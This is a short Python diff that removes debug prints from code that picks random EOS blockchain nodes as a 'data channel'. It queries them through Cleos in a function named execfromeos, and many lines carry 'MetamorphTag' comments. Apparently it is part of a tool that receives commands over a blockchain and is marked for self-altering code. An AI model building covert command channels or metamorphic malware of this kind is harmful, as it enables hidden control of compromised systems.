@@ -15,7 +15,7 @@ def randnode():
     lines = open('nodes').read().splitlines()
     myline =random.choice(lines)
     return (myline)
-print(randnode())
+
 # Get availiable node to use as a data channel ## MetamorphTag
 def getworkingnode(): ## MetamorphTag
     return randnode()  ## MetamorphTag
@@ -33,7 +33,7 @@ def execfromeos(options): ## MetamorphTag
         # improve with a list ## MetamorphTag
         ## conect to eos availiable node ## MetamorphTag
         try: ## MetamorphTag
-            print(randnode())
+            
             ce = Cleos(url=randnode()) ## MetamorphTag
 
             get_actions = ce.get_actions(addr) ## MetamorphTag
